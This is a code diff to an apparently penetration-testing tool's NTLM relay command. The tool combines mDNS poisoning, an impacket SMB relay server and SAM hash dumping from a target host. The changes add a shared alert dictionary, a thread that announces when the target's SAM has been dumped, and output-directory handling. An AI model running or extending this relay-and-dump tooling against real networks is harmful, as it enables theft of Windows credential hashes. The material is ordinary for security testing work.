@@ -8,7 +8,7 @@ from impacket.examples.ntlmrelayx.attacks.smbattack import SMBAttack
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from .Poison import MDNS
-from multiprocessing import Process
+from multiprocessing import Process, Manager
 from threading import Thread
 import sys
 import os
@@ -178,8 +178,13 @@ class NtlmRelay(CommandSet):
         self.__mdns_poisoner = None
         self.__smb_relay_server = None
         self.__ntlm_relay_process = None
-        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
+
         self.__ouput_sam_dir = os.getcwd()
+
+        # share between process
+        self.__alerts_dictionary = Manager().dict()
+        self.__define_alerts()
+        self.__alerts_hunter = None
 
         self.__attacks = {"SMB": SMBAttack}
         self.__clients = {"SMB": SMBRelayClient}
@@ -201,13 +206,30 @@ class NtlmRelay(CommandSet):
     def ntlm_relay_attack(self, attack: SmbRelayServer) -> None:
         self.__smb_relay_server = attack
 
+    def __define_alerts(self):
+        self.__alerts_dictionary["sam_dump"] = 0
+        self.__alerts_dictionary["new_connection"] = 0
+
     def __configure_alert_thread(self):
-        self.__check_sam_dumping_status = None
-        self.__check_sam_dumping_status = Thread(self.__is_sam_dumping)
-        self.__check_sam_dumping_status.dameon = True
-        self.__check_sam_dumping_status.start()
+        self.__alerts_hunter = Thread(target=self.__is_sam_dumping)
+        self.__alerts_hunter.dameon = True
+        self.__alerts_hunter.start()
 
     def __is_sam_dumping(self):
+        while True:
+            if self.__alerts_dictionary["sam_dump"] == 1:
+                print("hola")
+                if self._cmd.terminal_lock.acquire(blocking=False):
+                    self._cmd.async_alert(
+                        f"The SAM of {self._cmd.RHOST} has been dumped"
+                    )
+                    self._cmd.logger_info.debug(
+                        f"The SAM of {self._cmd.RHOST} has been dumped"
+                    )
+                    self._cmd.terminal_lock.release()
+
+                self.__alerts_dictionary["sam_dump"] = 0
+        """
         while True:
             if os.path.exists(self.__output_sam_dir + self.__output_sam_file):
                 if self.terminal_lock.acquire(blocking=False):
@@ -215,6 +237,7 @@ class NtlmRelay(CommandSet):
                         f"{self._cmd.RHOST} sam hashes have been dumped"
                     )
                     self.terminal_lock.release()
+        """
 
     def __try_exit(self, signum, frame):
         self._cmd.info_logger.debug("Block exit ...")
@@ -226,7 +249,7 @@ class NtlmRelay(CommandSet):
             mdns_poisoner (MDNS): [ variable with the mdns poisoner Object ]
             smbserver (SmbServer): [ variable with the SmbServer Object ]
         """
-        if not self.__check_directory(args.output_sam):
+        if not self.__check_directory():
             self._cmd.error_logger.warning(
                 "The specified directory does not exists or you don't have access"
             )
@@ -281,7 +304,7 @@ class NtlmRelay(CommandSet):
         self.__config.setSMB2Support(True)
         self.__config.interfaceIp = self._cmd.LHOST
 
-    def __store_sam_results_of_target() -> None:
+    def __store_sam_results_of_target(self) -> None:
         while True:
             try:
                 os.rename(
@@ -299,9 +322,9 @@ class NtlmRelay(CommandSet):
             except FileNotFoundError:
                 pass
 
-    def __check_directory(self, directory: str) -> bool:
-        return os.path.isdir(directory) and os.access(
-            directory, os.X_OK | os.W_OK
+    def __check_directory(self) -> bool:
+        return os.path.isdir(self.__output_sam_dir) and os.access(
+            self.__output_sam_dir, os.X_OK | os.W_OK
         )  # Executing and wirte
 
     argParser = Cmd2ArgumentParser(
@@ -330,6 +353,7 @@ class NtlmRelay(CommandSet):
         "-OS",
         "--output_sam",
         action="store",
+        default=".",
         help="Use a proxy server",
     )
     argParser.add_argument(
@@ -346,8 +370,13 @@ class NtlmRelay(CommandSet):
         Args:
             args (argparse.Namespace): [Arguments passed to the ntlm relay attack ]
         """
+        if args.output_sam != ".":
+            self.__output_sam_dir = args.output_sam
+        else:
+            self.__output_sam_dir = os.getcwd()
 
-        self.__output_sam_dir = args.output_sam
+        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
+
         self.__configure_alert_thread()
 
         if args.end_attack:
@@ -369,7 +398,7 @@ class NtlmRelay(CommandSet):
         self.__configure_ntlm_relay_attack()
         # output in case of -SS command
         self.__smb_relay_server = SmbRelayServer(
-            args.Asynchronous, args.proxy, self.__config
+            args.Asynchronous, args.proxy, self.__config, self.__alerts_dictionary
         )
 
         self._cmd.info_logger.debug(
@@ -410,7 +439,7 @@ class NtlmRelay(CommandSet):
                     tabulate(response.json(), headers=headers, tablefmt="sql")
                 )
             except RequestException:
-                self.error_logger("Error while trying to connect")
+                self.error_logger.error("Error while trying to connect")
         else:
             self._cmd.error_logger("The ntlm_relay process is not activated")
 
